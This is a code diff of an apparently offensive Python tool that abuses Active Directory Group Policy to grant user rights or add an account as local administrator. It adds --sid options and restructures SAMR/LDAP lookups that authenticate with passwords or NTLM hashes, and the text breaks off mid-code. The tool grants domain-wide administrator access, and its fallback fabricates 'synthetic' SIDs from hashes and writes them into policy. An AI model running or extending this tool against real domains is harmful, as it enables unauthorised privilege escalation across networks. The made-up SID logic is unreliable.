@@ -48,11 +48,13 @@ attack_type.add_argument('--restore-gpo', action='store_true', help='Restore a G
 # User Rights arguments
 rights_group = parser.add_argument_group('User Rights arguments (use with --add-rights)')
 rights_group.add_argument('-rights', action='store', help='Comma-separated list of rights to assign')
-rights_group.add_argument('-user-account', action='store', help='User account to assign rights to')
+rights_group.add_argument('-user-account', action='store', help='User account to assign rights to (not required if --user-sid is specified)')
+rights_group.add_argument('--user-sid', action='store', help='Security Identifier (SID) of the user to assign rights to. When specified, SID lookup is bypassed.')
 
 # Local Admin arguments
 admin_group = parser.add_argument_group('Local Admin arguments (use with --add-local-admin)')
-admin_group.add_argument('-admin-account', action='store', help='User account to add as local administrator')
+admin_group.add_argument('-admin-account', action='store', help='User account to add as local administrator (not required if --sid is specified)')
+admin_group.add_argument('--sid', action='store', help='Security Identifier (SID) of the user to add (e.g., S-1-5-21-X-Y-Z-RID). When specified, SID lookup is bypassed.')
 
 # Scheduled Task arguments
 task_group = parser.add_argument_group('ScheduledTask arguments (use with --add-task)')
@@ -175,222 +177,255 @@ try:
         if not options.rights:
             logging.error("Rights must be specified with -rights parameter")
             sys.exit(1)
-        if not options.user_account:
-            logging.error("User account must be specified with -user-account parameter")
+        if not options.user_account and not options.user_sid:
+            logging.error("Either -user-account or --user-sid must be specified")
             sys.exit(1)
             
-        # Get SID of the user account
-        from impacket.dcerpc.v5 import samr, transport
-        rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
-        if options.k:
-            rpctransport.set_kerberos(True, options.dc_ip)
-        if options.hashes:
-            lmhash, nthash = options.hashes.split(':')
-            rpctransport.set_credentials(username, '', domain, lmhash, nthash, None)
-        else:
-            rpctransport.set_credentials(username, password, domain, '', '', None)
+        # If SID is provided directly, use it without lookup
+        if options.user_sid:
+            user_sid = options.user_sid
+            username = options.user_account or "User"  # Use account name if provided, otherwise generic
+            logging.info(f"Using provided SID: {user_sid}")
             
-        dce = rpctransport.get_dce_rpc()
-        dce.connect()
-        dce.bind(samr.MSRPC_UUID_SAMR)
-        
-        logging.debug("Connected to SAMR")
-        
-        try:
-            resp = samr.hSamrConnect(dce)
-            server_handle = resp['ServerHandle']
+            # Add user rights with the provided SID
+            success = gpo.update_user_rights(
+                domain=domain,
+                gpo_id=options.gpo_id,
+                username=username,
+                sid=user_sid,
+                rights=options.rights,
+                force=options.f
+            )
             
-            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
-            domain_sid = resp['DomainId']
-            
-            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
-            domain_handle = resp['DomainHandle']
-            
-            resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [options.user_account])
-            # Avoid direct string representation of the response which may contain bytes
-            logging.debug("SAMR lookup response received")
-            
-            # Extract the RID directly from the response
-            if 'RelativeIds' in resp and 'Element' in resp['RelativeIds']:
-                user_rid = resp['RelativeIds']['Element'][0]
-                # Avoid direct string representation which might cause issues
-                if isinstance(user_rid, bytes):
-                    logging.debug(f"Raw user_rid is bytes of length {len(user_rid)}")
+            if success:
+                if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer"):  # User rights are always computer GPO
+                    logging.info("Version updated")
+                    logging.success(f"User rights successfully added for {username} with SID {user_sid}!")
                 else:
-                    logging.debug(f"Raw user_rid type: {type(user_rid)}")
-                
-                # Try to convert the RID to an integer value
-                if isinstance(user_rid, bytes):
-                    try:
-                        # Convert bytes to int
-                        rid_int = int.from_bytes(user_rid, byteorder='little')
-                        logging.debug(f"Converted RID from bytes: {rid_int}")
-                    except Exception as e:
-                        logging.error(f"Failed to convert RID bytes to int: {str(e)}")
-                        rid_int = None
-                elif isinstance(user_rid, int):
-                    rid_int = user_rid
-                    logging.debug(f"RID is already an integer: {rid_int}")
-                else:
-                    try:
-                        # Try to convert to int if it's a string or other type
-                        rid_int = int(user_rid)
-                        logging.debug(f"Converted RID from {type(user_rid)}: {rid_int}")
-                    except Exception as e:
-                        logging.error(f"Failed to convert RID to int: {str(e)}")
-                        rid_int = None
+                    logging.error("Error while updating versions")
+                    sys.exit(1)
             else:
-                logging.error("Could not find RelativeIds in the lookup response")
-                rid_int = None
-                
-            # If we couldn't get a valid RID, try looking up the user directly
-            if rid_int is None:
-                try:
-                    logging.debug(f"Trying direct LDAP lookup for user: {options.user_account}")
-                    
-                    # Use LDAP to get the user's SID directly
-                    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
-                    
-                    # Create an LDAP connection
-                    ldap_server = Server(dc_ip, get_info=ALL)
-                    
-                    # Connect with the existing credentials
-                    if options.k:
-                        logging.debug("Using Kerberos authentication for LDAP")
-                        # We'd need to implement Kerberos auth for ldap3 here
-                        # For simplicity, we'll skip this and only handle NTLM
-                        ldap_conn = None
-                    else:
-                        # Use NTLM auth
-                        if options.hashes:
-                            logging.debug("Using NTLM hash authentication for LDAP")
-                            nt_hash = options.hashes.split(':')[1]
-                            ldap_conn = Connection(
-                                ldap_server,
-                                user=f"{domain}\\{username}",
-                                password=nt_hash,
-                                authentication=NTLM
-                            )
-                        else:
-                            logging.debug("Using password authentication for LDAP")
-                            ldap_conn = Connection(
-                                ldap_server,
-                                user=f"{domain}\\{username}",
-                                password=password,
-                                authentication=NTLM
-                            )
-                    
-                    # If we have a connection, try to bind and search
-                    if ldap_conn and ldap_conn.bind():
-                        logging.debug("LDAP connection established")
-                        
-                        # Set up the search parameters
-                        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
-                        search_filter = f"(sAMAccountName={options.user_account})"
-                        attributes = ['objectSid']
-                        
-                        # Search for the user
-                        ldap_conn.search(
-                            search_base=base_dn,
-                            search_filter=search_filter,
-                            search_scope=SUBTREE,
-                            attributes=attributes
-                        )
-                        
-                        # If we found an entry with the SID
-                        if len(ldap_conn.entries) > 0 and hasattr(ldap_conn.entries[0], 'objectSid'):
-                            # Extract the SID
-                            user_sid = ldap_conn.entries[0].objectSid.value
-                            logging.debug(f"Found user SID via LDAP: {user_sid}")
-                            
-                            # No need to continue with the rest of the logic
-                            # Skip to the user rights update
-                            ldap_conn.unbind()
-                        else:
-                            logging.debug("User not found via LDAP or SID attribute missing")
-                    else:
-                        logging.debug("Failed to establish LDAP connection")
-                except Exception as e:
-                    logging.debug(f"Error during LDAP lookup: {str(e)}")
-                    # Continue with the existing approach
+                logging.error("Failed to add user rights")
+                sys.exit(1)
+        
+        # If no SID provided, try to resolve it from the account name
+        else:
+            # Get SID of the user account
+            from impacket.dcerpc.v5 import samr, transport
+            rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
+            if options.k:
+                rpctransport.set_kerberos(True, options.dc_ip)
+            if options.hashes:
+                lmhash, nthash = options.hashes.split(':')
+                rpctransport.set_credentials(username, '', domain, lmhash, nthash, None)
+            else:
+                rpctransport.set_credentials(username, password, domain, '', '', None)
             
-            # If we still couldn't get the user SID via LDAP, try the SAMR approach
-            if 'user_sid' not in locals():
-                # We now have the numeric RID, proceed with user handle operations
-                try:
-                    resp = samr.hSamrOpenUser(dce, domain_handle, desiredAccess=samr.MAXIMUM_ALLOWED, userId=user_rid)
-                    user_handle = resp['UserHandle']
+            dce = rpctransport.get_dce_rpc()
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
+            
+            logging.debug("Connected to SAMR")
+            
+            try:
+                resp = samr.hSamrConnect(dce)
+                server_handle = resp['ServerHandle']
+                
+                resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
+                domain_sid = resp['DomainId']
+                
+                resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
+                domain_handle = resp['DomainHandle']
+                
+                resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [options.user_account])
+                # Avoid direct string representation of the response which may contain bytes
+                logging.debug("SAMR lookup response received")
+                
+                # Extract the RID directly from the response
+                if 'RelativeIds' in resp and 'Element' in resp['RelativeIds']:
+                    user_rid = resp['RelativeIds']['Element'][0]
+                    # Avoid direct string representation which might cause issues
+                    if isinstance(user_rid, bytes):
+                        logging.debug(f"Raw user_rid is bytes of length {len(user_rid)}")
+                    else:
+                        logging.debug(f"Raw user_rid type: {type(user_rid)}")
                     
-                    resp = samr.hSamrQueryInformationUser(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
-                    # Use a proper approach to extract the domain SID components
-                    try:
-                        # Debug the domain SID object
-                        logging.debug(f"Domain SID object type: {type(domain_sid)}")
-                        
-                        # Try different approaches to get the domain SID
+                    # Try to convert the RID to an integer value
+                    if isinstance(user_rid, bytes):
                         try:
-                            # Use formatCanonical() with proper error handling
-                            if hasattr(domain_sid, 'formatCanonical'):
-                                sid_canonical = domain_sid.formatCanonical()
-                                if isinstance(sid_canonical, bytes):
-                                    try:
-                                        sid_canonical = sid_canonical.decode('latin-1', errors='ignore')
-                                        logging.debug(f"Decoded SID canonical: {sid_canonical}")
-                                        
-                                        # Extract the domain components (everything up to but not including any RID)
-                                        parts = sid_canonical.split('-')
-                                        if len(parts) >= 4:  # S-1-5-21-X-Y-Z needs at least 4 components
-                                            # Use either the full SID or just the domain part (without the RID)
-                                            # If the SID already has a RID at the end (more than 7 parts), remove it
-                                            if len(parts) > 7:
-                                                sid_canonical = '-'.join(parts[:-1])  # Remove last component (RID)
-                                            logging.debug(f"Domain SID prefix from formatCanonical: {sid_canonical}")
-                                        else:
+                            # Convert bytes to int
+                            rid_int = int.from_bytes(user_rid, byteorder='little')
+                            logging.debug(f"Converted RID from bytes: {rid_int}")
+                        except Exception as e:
+                            logging.error(f"Failed to convert RID bytes to int: {str(e)}")
+                            rid_int = None
+                    elif isinstance(user_rid, int):
+                        rid_int = user_rid
+                        logging.debug(f"RID is already an integer: {rid_int}")
+                    else:
+                        try:
+                            # Try to convert to int if it's a string or other type
+                            rid_int = int(user_rid)
+                            logging.debug(f"Converted RID from {type(user_rid)}: {rid_int}")
+                        except Exception as e:
+                            logging.error(f"Failed to convert RID to int: {str(e)}")
+                            rid_int = None
+                else:
+                    logging.error("Could not find RelativeIds in the lookup response")
+                    rid_int = None
+                    
+                # If we couldn't get a valid RID, try looking up the user directly
+                if rid_int is None:
+                    try:
+                        logging.debug(f"Trying direct LDAP lookup for user: {options.user_account}")
+                        
+                        # Use LDAP to get the user's SID directly
+                        from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
+                        
+                        # Create an LDAP connection
+                        ldap_server = Server(dc_ip, get_info=ALL)
+                        
+                        # Connect with the existing credentials
+                        if options.k:
+                            logging.debug("Using Kerberos authentication for LDAP")
+                            # We'd need to implement Kerberos auth for ldap3 here
+                            # For simplicity, we'll skip this and only handle NTLM
+                            ldap_conn = None
+                        else:
+                            # Use NTLM auth
+                            if options.hashes:
+                                logging.debug("Using NTLM hash authentication for LDAP")
+                                nt_hash = options.hashes.split(':')[1]
+                                ldap_conn = Connection(
+                                    ldap_server,
+                                    user=f"{domain}\\{username}",
+                                    password=nt_hash,
+                                    authentication=NTLM
+                                )
+                            else:
+                                logging.debug("Using password authentication for LDAP")
+                                ldap_conn = Connection(
+                                    ldap_server,
+                                    user=f"{domain}\\{username}",
+                                    password=password,
+                                    authentication=NTLM
+                                )
+                        
+                        # If we have a connection, try to bind and search
+                        if ldap_conn and ldap_conn.bind():
+                            logging.debug("LDAP connection established")
+                            
+                            # Set up the search parameters
+                            base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
+                            search_filter = f"(sAMAccountName={options.user_account})"
+                            attributes = ['objectSid']
+                            
+                            # Search for the user
+                            ldap_conn.search(
+                                search_base=base_dn,
+                                search_filter=search_filter,
+                                search_scope=SUBTREE,
+                                attributes=attributes
+                            )
+                            
+                            # If we found an entry with the SID
+                            if len(ldap_conn.entries) > 0 and hasattr(ldap_conn.entries[0], 'objectSid'):
+                                # Extract the SID
+                                user_sid = ldap_conn.entries[0].objectSid.value
+                                logging.debug(f"Found user SID via LDAP: {user_sid}")
+                                
+                                # No need to continue with the rest of the logic
+                                # Skip to the user rights update
+                                ldap_conn.unbind()
+                            else:
+                                logging.debug("User not found via LDAP or SID attribute missing")
+                        else:
+                            logging.debug("Failed to establish LDAP connection")
+                    except Exception as e:
+                        logging.debug(f"Error during LDAP lookup: {str(e)}")
+                        # Continue with the existing approach
+                
+                # If we still couldn't get the user SID via LDAP, try the SAMR approach
+                if 'user_sid' not in locals():
+                    try:
+                        # We now have the numeric RID, proceed with user handle operations
+                        resp = samr.hSamrOpenUser(dce, domain_handle, desiredAccess=samr.MAXIMUM_ALLOWED, userId=user_rid)
+                        user_handle = resp['UserHandle']
+                        
+                        resp = samr.hSamrQueryInformationUser(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
+                        # Use a proper approach to extract the domain SID components
+                        try:
+                            # Debug the domain SID object
+                            logging.debug(f"Domain SID object type: {type(domain_sid)}")
+                            
+                            # Try different approaches to get the domain SID
+                            try:
+                                # Use formatCanonical() with proper error handling
+                                if hasattr(domain_sid, 'formatCanonical'):
+                                    sid_canonical = domain_sid.formatCanonical()
+                                    if isinstance(sid_canonical, bytes):
+                                        try:
+                                            sid_canonical = sid_canonical.decode('latin-1', errors='ignore')
+                                            logging.debug(f"Decoded SID canonical: {sid_canonical}")
+                                            
+                                            # Extract the domain components (everything up to but not including any RID)
+                                            parts = sid_canonical.split('-')
+                                            if len(parts) >= 4:  # S-1-5-21-X-Y-Z needs at least 4 components
+                                                # Use either the full SID or just the domain part (without the RID)
+                                                # If the SID already has a RID at the end (more than 7 parts), remove it
+                                                if len(parts) > 7:
+                                                    sid_canonical = '-'.join(parts[:-1])  # Remove last component (RID)
+                                                logging.debug(f"Domain SID prefix from formatCanonical: {sid_canonical}")
+                                            else:
+                                                sid_canonical = None
+                                        except Exception as e:
+                                            logging.debug(f"Error decoding sid_canonical: {str(e)}")
+                                            # Handle the case where we can't decode
+                                            sid_canonical_hex = ' '.join([f'{b:02x}' for b in sid_canonical])
+                                            logging.debug(f"SID canonical as hex: {sid_canonical_hex}")
                                             sid_canonical = None
-                                    except Exception as e:
-                                        logging.debug(f"Error decoding sid_canonical: {str(e)}")
-                                        # Handle the case where we can't decode
-                                        sid_canonical_hex = ' '.join([f'{b:02x}' for b in sid_canonical])
-                                        logging.debug(f"SID canonical as hex: {sid_canonical_hex}")
+                                    else:
                                         sid_canonical = None
                                 else:
                                     sid_canonical = None
-                            else:
+                            except Exception as e:
+                                logging.debug(f"Error extracting domain SID with formatCanonical: {str(e)}")
                                 sid_canonical = None
+                            
+                            # If we have a valid domain SID prefix and RID, construct the full SID
+                            if sid_canonical and rid_int:
+                                user_sid = f"{sid_canonical}-{rid_int}"
+                                logging.debug(f"Constructed complete SID from SAMR: {user_sid}")
+                            else:
+                                # If we couldn't get both parts, use a fallback
+                                import hashlib
+                                domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
+                                user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int or 500}"
+                                logging.debug(f"Using synthetic SID: {user_sid}")
                         except Exception as e:
-                            logging.debug(f"Error extracting domain SID with formatCanonical: {str(e)}")
-                            sid_canonical = None
-                        
-                        # If we have a valid domain SID prefix and RID, construct the full SID
-                        if sid_canonical and rid_int:
-                            user_sid = f"{sid_canonical}-{rid_int}"
-                            logging.debug(f"Constructed complete SID from SAMR: {user_sid}")
-                        else:
-                            # If we couldn't get both parts, use a fallback
+                            logging.error(f"Error constructing SID: {str(e)}")
+                            # Still need a fallback
                             import hashlib
                             domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
                             user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int or 500}"
-                            logging.debug(f"Using synthetic SID: {user_sid}")
+                            logging.debug(f"Using synthetic SID after error: {user_sid}")
                     except Exception as e:
-                        logging.error(f"Error constructing SID: {str(e)}")
-                        # Still need a fallback
-                        import hashlib
-                        domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
-                        user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int or 500}"
-                        logging.debug(f"Using synthetic SID after error: {user_sid}")
-                except Exception as e:
-                    logging.error(f"Error in SAMR approach: {str(e)}")
-                    if rid_int:
-                        # If we have at least the RID, create a synthetic SID
-                        import hashlib
-                        domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
-                        user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int}"
-                    else:
-                        # Complete fallback
-                        logging.error(f"Could not resolve SID for user {options.user_account}")
-                        sys.exit(1)
+                        logging.error(f"Error in SAMR approach: {str(e)}")
+                        if rid_int:
+                            # If we have at least the RID, create a synthetic SID
+                            import hashlib
+                            domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
+                            user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int}"
+                        else:
+                            # Complete fallback
+                            logging.error(f"Could not resolve SID for user {options.user_account}")
+                            sys.exit(1)
             
-            logging.info("User SID for {} is {}".format(options.user_account, user_sid))
+            except Exception as e:
+                logging.error(f"Error constructing SID: {str(e)}")
+                sys.exit(1)
+            
+            logging.info(f"User SID for {options.user_account} is {user_sid}")
             
             # Close handles
             samr.hSamrCloseHandle(dce, user_handle)
@@ -410,247 +445,31 @@ try:
             if success:
                 if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer"):  # User rights are always computer GPO
                     logging.info("Version updated")
-                    logging.success("User rights successfully added for {}!".format(options.user_account))
+                    logging.success(f"User rights successfully added for {options.user_account} with SID {user_sid}!")
                 else:
                     logging.error("Error while updating versions")
                     sys.exit(1)
             else:
                 logging.error("Failed to add user rights")
                 sys.exit(1)
-            
-        except Exception as e:
-            logging.error(f"Error constructing SID: {str(e)}")
-            sys.exit(1)
-            
+    
     elif options.add_local_admin:
         # Check required parameters for adding local admin
-        if not options.admin_account:
-            logging.error("User account must be specified with -admin-account parameter")
+        if not options.admin_account and not options.sid:
+            logging.error("Either -admin-account or --sid must be specified")
             sys.exit(1)
             
-        # Get SID of the user account
-        from impacket.dcerpc.v5 import samr, transport
-        rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
-        if options.k:
-            rpctransport.set_kerberos(True, options.dc_ip)
-        if options.hashes:
-            lmhash, nthash = options.hashes.split(':')
-            rpctransport.set_credentials(username, '', domain, lmhash, nthash, None)
-        else:
-            rpctransport.set_credentials(username, password, domain, '', '', None)
+        # If SID is provided directly, use it without lookup
+        if options.sid:
+            user_sid = options.sid
+            username = options.admin_account or "User"  # Use account name if provided, otherwise generic
+            logging.info(f"Using provided SID: {user_sid}")
             
-        dce = rpctransport.get_dce_rpc()
-        dce.connect()
-        dce.bind(samr.MSRPC_UUID_SAMR)
-        
-        logging.debug("Connected to SAMR")
-        
-        try:
-            resp = samr.hSamrConnect(dce)
-            server_handle = resp['ServerHandle']
-            
-            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
-            domain_sid = resp['DomainId']
-            
-            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
-            domain_handle = resp['DomainHandle']
-            
-            resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [options.admin_account])
-            # Avoid direct string representation of the response which may contain bytes
-            logging.debug("SAMR lookup response received")
-            
-            # Extract the RID directly from the response
-            if 'RelativeIds' in resp and 'Element' in resp['RelativeIds']:
-                user_rid = resp['RelativeIds']['Element'][0]
-                # Avoid direct string representation which might cause issues
-                if isinstance(user_rid, bytes):
-                    logging.debug(f"Raw user_rid is bytes of length {len(user_rid)}")
-                else:
-                    logging.debug(f"Raw user_rid type: {type(user_rid)}")
-                
-                # Try to convert the RID to an integer value
-                if isinstance(user_rid, bytes):
-                    try:
-                        # Convert bytes to int
-                        rid_int = int.from_bytes(user_rid, byteorder='little')
-                        logging.debug(f"Converted RID from bytes: {rid_int}")
-                    except Exception as e:
-                        logging.error(f"Failed to convert RID bytes to int: {str(e)}")
-                        rid_int = None
-                elif isinstance(user_rid, int):
-                    rid_int = user_rid
-                    logging.debug(f"RID is already an integer: {rid_int}")
-                else:
-                    try:
-                        # Try to convert to int if it's a string or other type
-                        rid_int = int(user_rid)
-                        logging.debug(f"Converted RID from {type(user_rid)}: {rid_int}")
-                    except Exception as e:
-                        logging.error(f"Failed to convert RID to int: {str(e)}")
-                        rid_int = None
-            else:
-                logging.error("Could not find RelativeIds in the lookup response")
-                rid_int = None
-                
-            # If we couldn't get a valid RID, try looking up the user directly
-            if rid_int is None:
-                try:
-                    logging.debug(f"Trying direct LDAP lookup for user: {options.admin_account}")
-                    
-                    # Use LDAP to get the user's SID directly
-                    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
-                    
-                    # Create an LDAP connection
-                    ldap_server = Server(dc_ip, get_info=ALL)
-                    
-                    # Connect with the existing credentials
-                    if options.k:
-                        logging.debug("Using Kerberos authentication for LDAP")
-                        # We'd need to implement Kerberos auth for ldap3 here
-                        # For simplicity, we'll skip this and only handle NTLM
-                        ldap_conn = None
-                    else:
-                        # Use NTLM auth
-                        if options.hashes:
-                            logging.debug("Using NTLM hash authentication for LDAP")
-                            nt_hash = options.hashes.split(':')[1]
-                            ldap_conn = Connection(
-                                ldap_server,
-                                user=f"{domain}\\{username}",
-                                password=nt_hash,
-                                authentication=NTLM
-                            )
-                        else:
-                            logging.debug("Using password authentication for LDAP")
-                            ldap_conn = Connection(
-                                ldap_server,
-                                user=f"{domain}\\{username}",
-                                password=password,
-                                authentication=NTLM
-                            )
-                    
-                    # If we have a connection, try to bind and search
-                    if ldap_conn and ldap_conn.bind():
-                        logging.debug("LDAP connection established")
-                        
-                        # Set up the search parameters
-                        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
-                        search_filter = f"(sAMAccountName={options.admin_account})"
-                        attributes = ['objectSid']
-                        
-                        # Search for the user
-                        ldap_conn.search(
-                            search_base=base_dn,
-                            search_filter=search_filter,
-                            search_scope=SUBTREE,
-                            attributes=attributes
-                        )
-                        
-                        # If we found an entry with the SID
-                        if len(ldap_conn.entries) > 0 and hasattr(ldap_conn.entries[0], 'objectSid'):
-                            # Extract the SID
-                            user_sid = ldap_conn.entries[0].objectSid.value
-                            logging.debug(f"Found user SID via LDAP: {user_sid}")
-                            
-                            # No need to continue with the rest of the logic
-                            # Skip to the user rights update
-                            ldap_conn.unbind()
-                        else:
-                            logging.debug("User not found via LDAP or SID attribute missing")
-                    else:
-                        logging.debug("Failed to establish LDAP connection")
-                except Exception as e:
-                    logging.debug(f"Error during LDAP lookup: {str(e)}")
-                    # Continue with the existing approach
-            
-            # If we still couldn't get the user SID via LDAP, try the SAMR approach
-            if 'user_sid' not in locals():
-                # We now have the numeric RID, proceed with user handle operations
-                try:
-                    resp = samr.hSamrOpenUser(dce, domain_handle, desiredAccess=samr.MAXIMUM_ALLOWED, userId=user_rid)
-                    user_handle = resp['UserHandle']
-                    
-                    resp = samr.hSamrQueryInformationUser(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
-                    # Use a proper approach to extract the domain SID components
-                    try:
-                        # Debug the domain SID object
-                        logging.debug(f"Domain SID object type: {type(domain_sid)}")
-                        
-                        # Try different approaches to get the domain SID
-                        try:
-                            # Use formatCanonical() with proper error handling
-                            if hasattr(domain_sid, 'formatCanonical'):
-                                sid_canonical = domain_sid.formatCanonical()
-                                if isinstance(sid_canonical, bytes):
-                                    try:
-                                        sid_canonical = sid_canonical.decode('latin-1', errors='ignore')
-                                        logging.debug(f"Decoded SID canonical: {sid_canonical}")
-                                        
-                                        # Extract the domain components (everything up to but not including any RID)
-                                        parts = sid_canonical.split('-')
-                                        if len(parts) >= 4:  # S-1-5-21-X-Y-Z needs at least 4 components
-                                            # Use either the full SID or just the domain part (without the RID)
-                                            # If the SID already has a RID at the end (more than 7 parts), remove it
-                                            if len(parts) > 7:
-                                                sid_canonical = '-'.join(parts[:-1])  # Remove last component (RID)
-                                            logging.debug(f"Domain SID prefix from formatCanonical: {sid_canonical}")
-                                        else:
-                                            sid_canonical = None
-                                    except Exception as e:
-                                        logging.debug(f"Error decoding sid_canonical: {str(e)}")
-                                        # Handle the case where we can't decode
-                                        sid_canonical_hex = ' '.join([f'{b:02x}' for b in sid_canonical])
-                                        logging.debug(f"SID canonical as hex: {sid_canonical_hex}")
-                                        sid_canonical = None
-                                else:
-                                    sid_canonical = None
-                            else:
-                                sid_canonical = None
-                        except Exception as e:
-                            logging.debug(f"Error extracting domain SID with formatCanonical: {str(e)}")
-                            sid_canonical = None
-                        
-                        # If we have a valid domain SID prefix and RID, construct the full SID
-                        if sid_canonical and rid_int:
-                            user_sid = f"{sid_canonical}-{rid_int}"
-                            logging.debug(f"Constructed complete SID from SAMR: {user_sid}")
-                        else:
-                            # If we couldn't get both parts, use a fallback
-                            import hashlib
-                            domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
-                            user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int or 500}"
-                            logging.debug(f"Using synthetic SID: {user_sid}")
-                    except Exception as e:
-                        logging.error(f"Error constructing SID: {str(e)}")
-                        # Still need a fallback
-                        import hashlib
-                        domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
-                        user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int or 500}"
-                        logging.debug(f"Using synthetic SID after error: {user_sid}")
-                except Exception as e:
-                    logging.error(f"Error in SAMR approach: {str(e)}")
-                    if rid_int:
-                        # If we have at least the RID, create a synthetic SID
-                        import hashlib
-                        domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
-                        user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int}"
-                    else:
-                        # Complete fallback
-                        logging.error(f"Could not resolve SID for user {options.admin_account}")
-                        sys.exit(1)
-            
-            logging.info("User SID for {} is {}".format(options.admin_account, user_sid))
-            
-            # Close handles
-            samr.hSamrCloseHandle(dce, user_handle)
-            samr.hSamrCloseHandle(dce, domain_handle)
-            samr.hSamrCloseHandle(dce, server_handle)
-            
-            # Add local admin
+            # Add local admin with the provided SID
             success = gpo.add_local_admin(
                 domain=domain,
                 gpo_id=options.gpo_id,
-                username=options.admin_account,
+                username=username,
                 sid=user_sid,
                 force=options.f
             )
@@ -658,7 +477,7 @@ try:
             if success:
                 if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer"):  # Local admin is always computer GPO
                     logging.info("Version updated")
-                    logging.success("User {} successfully added as local administrator!".format(options.admin_account))
+                    logging.success(f"User {username} with SID {user_sid} successfully added as local administrator!")
                 else:
                     logging.error("Error while updating versions")
                     sys.exit(1)
@@ -666,9 +485,249 @@ try:
                 logging.error("Failed to add local admin")
                 sys.exit(1)
         
-        except Exception as e:
-            logging.error(f"Error constructing SID: {str(e)}")
-            sys.exit(1)
+        # If no SID provided, try to resolve it from the account name
+        else:
+            # Get SID of the user account
+            from impacket.dcerpc.v5 import samr, transport
+            rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
+            if options.k:
+                rpctransport.set_kerberos(True, options.dc_ip)
+            if options.hashes:
+                lmhash, nthash = options.hashes.split(':')
+                rpctransport.set_credentials(username, '', domain, lmhash, nthash, None)
+            else:
+                rpctransport.set_credentials(username, password, domain, '', '', None)
+            
+            dce = rpctransport.get_dce_rpc()
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
+            
+            logging.debug("Connected to SAMR")
+            
+            try:
+                resp = samr.hSamrConnect(dce)
+                server_handle = resp['ServerHandle']
+                
+                resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
+                domain_sid = resp['DomainId']
+                
+                resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
+                domain_handle = resp['DomainHandle']
+                
+                resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [options.admin_account])
+                # Avoid direct string representation of the response which may contain bytes
+                logging.debug("SAMR lookup response received")
+                
+                # Extract the RID directly from the response
+                if 'RelativeIds' in resp and 'Element' in resp['RelativeIds']:
+                    user_rid = resp['RelativeIds']['Element'][0]
+                    # Avoid direct string representation which might cause issues
+                    if isinstance(user_rid, bytes):
+                        logging.debug(f"Raw user_rid is bytes of length {len(user_rid)}")
+                    else:
+                        logging.debug(f"Raw user_rid type: {type(user_rid)}")
+                    
+                    # Try to convert the RID to an integer value
+                    if isinstance(user_rid, bytes):
+                        try:
+                            # Convert bytes to int
+                            rid_int = int.from_bytes(user_rid, byteorder='little')
+                            logging.debug(f"Converted RID from bytes: {rid_int}")
+                        except Exception as e:
+                            logging.error(f"Failed to convert RID bytes to int: {str(e)}")
+                            rid_int = None
+                    elif isinstance(user_rid, int):
+                        rid_int = user_rid
+                        logging.debug(f"RID is already an integer: {rid_int}")
+                    else:
+                        try:
+                            # Try to convert to int if it's a string or other type
+                            rid_int = int(user_rid)
+                            logging.debug(f"Converted RID from {type(user_rid)}: {rid_int}")
+                        except Exception as e:
+                            logging.error(f"Failed to convert RID to int: {str(e)}")
+                            rid_int = None
+                else:
+                    logging.error("Could not find RelativeIds in the lookup response")
+                    rid_int = None
+                    
+                # If we couldn't get a valid RID, try looking up the user directly
+                if rid_int is None:
+                    try:
+                        logging.debug(f"Trying direct LDAP lookup for user: {options.admin_account}")
+                        
+                        # Use LDAP to get the user's SID directly
+                        from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
+                        
+                        # Create an LDAP connection
